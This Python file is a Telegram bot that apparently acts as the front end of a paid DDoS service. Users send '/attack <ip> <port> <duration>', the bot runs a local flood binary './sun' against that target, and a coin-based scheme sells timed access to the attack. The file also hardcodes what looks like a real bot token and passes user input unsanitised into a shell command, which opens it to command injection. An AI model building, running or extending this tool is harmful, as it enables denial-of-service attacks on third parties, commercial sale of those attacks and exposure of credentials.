import sys
import subprocess
import threading
import time
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# Global variables
running = False  # Flag to track if an attack is running
cooldown_time = 0  # Global cooldown timer
admins = {}      # Dictionary to store admins and their coins
users = {}       # Dictionary to store users and their access expiry
owner_id = 1257888659  # Replace with your Telegram user ID

# Start command handler
def start(update: Update, context: CallbackContext):
    update.message.reply_text(
        "Welcome to Tabish official Bot!\n"
        "Use /attack <ip> <port> <duration> to start an attack.\n"
        "Example: /attack 192.168.1.1 8080 60\n"
        "Use /stop to stop the attack."
    )

# Attack command handler
def attack(update: Update, context: CallbackContext):
    global running, cooldown_time

    if running:
        update.message.reply_text("An attack is already running. Use /stop to stop it.")
        return

    # Check global cooldown
    if time.time() < cooldown_time:
        update.message.reply_text(f"Cooldown active. Please wait {int(cooldown_time - time.time())} seconds.")
        return

    # Parse command arguments
    try:
        target = context.args[0]
        port = int(context.args[1])
        attack_time = int(context.args[2])
    except (IndexError, ValueError):
        update.message.reply_text(
            "Invalid command format.\n"
            "Usage: /attack <ip> <port> <duration>\n"
            "Example: /attack 192.168.1.1 8080 60"
        )
        return

    # Start the attack using the binary executable
    running = True
    update.message.reply_text(f"Starting attack on {target}:{port}...")

    def run_attack():
        global running, cooldown_time
        try:
            # Construct the command to call the binary
            full_command = f"./sun {target} {port} {attack_time} 900"
            process = subprocess.run(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            # Check if the attack was successful
            if process.returncode == 0:
                response = f"Attack Finished. Target: {target} Port: {port} Time: {attack_time}"
            else:
                response = f"Attack Failed. Error: {process.stderr.decode().strip()}"
        except Exception as e:
            response = f"Error: {e}"
        finally:
            running = False
            cooldown_time = time.time() + 300  # Set cooldown to 5 minutes
            update.message.reply_text(response)

    # Run the attack in a separate thread
    threading.Thread(target=run_attack).start()

# Stop command handler
def stop(update: Update, context: CallbackContext):
    global running

    if not running:
        update.message.reply_text("No attack is currently running.")
        return

    # Stop the attack
    running = False
    update.message.reply_text("Attack stopped.")

# Add admin command handler
def add_admin(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id

    # Only the owner can add admins
    if user_id != owner_id:
        update.message.reply_text("You are not authorized to add admins.")
        return

    try:
        admin_id = int(context.args[0])
        coins = int(context.args[1])
        admins[admin_id] = coins
        update.message.reply_text(f"Admin added with ID {admin_id} and {coins} coins.")
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /addadmin <admin_id> <coins>")

# Add user command handler
def add_user(update: Update, context: CallbackContext):
    admin_id = update.message.from_user.id

    # Only admins can add users
    if admin_id not in admins:
        update.message.reply_text("You are not authorized to add users.")
        return

    try:
        user_id = int(context.args[0])
        duration = int(context.args[1])
        unit = context.args[2].lower()

        # Calculate expiry time
        current_time = time.time()
        if unit == "days":
            expiry_time = current_time + (duration * 86400)
        elif unit == "hours":
            expiry_time = current_time + (duration * 3600)
        elif unit == "months":
            expiry_time = current_time + (duration * 2592000)  # Approximate 30 days per month
        else:
            update.message.reply_text("Invalid unit. Use 'days', 'hours', or 'months'.")
            return

        # Deduct coins from admin
        if admins[admin_id] < duration:
            update.message.reply_text("Insufficient coins.")
            return
        admins[admin_id] -= duration

        # Add user
        users[user_id] = expiry_time
        update.message.reply_text(f"User {user_id} added with access until {time.ctime(expiry_time)}.")
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /adduser <user_id> <duration> <unit>")

# Check access command handler
def check_access(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id

    if user_id in users and time.time() < users[user_id]:
        update.message.reply_text(f"Your access is valid until {time.ctime(users[user_id])}.")
    else:
        update.message.reply_text("You do not have access.")

# Main function
def main():
    # Replace 'YOUR_BOT_TOKEN' with your actual bot token
    bot_token = "6098885239:AAGT-cc6fHXh24HI8BzN3CuXrDjLwxdvxP0"

    # Set up the bot
    updater = Updater(bot_token)
    dispatcher = updater.dispatcher

    # Add command handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("attack", attack))
    dispatcher.add_handler(CommandHandler("stop", stop))
    dispatcher.add_handler(CommandHandler("addadmin", add_admin))
    dispatcher.add_handler(CommandHandler("adduser", add_user))
    dispatcher.add_handler(CommandHandler("checkaccess", check_access))

    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()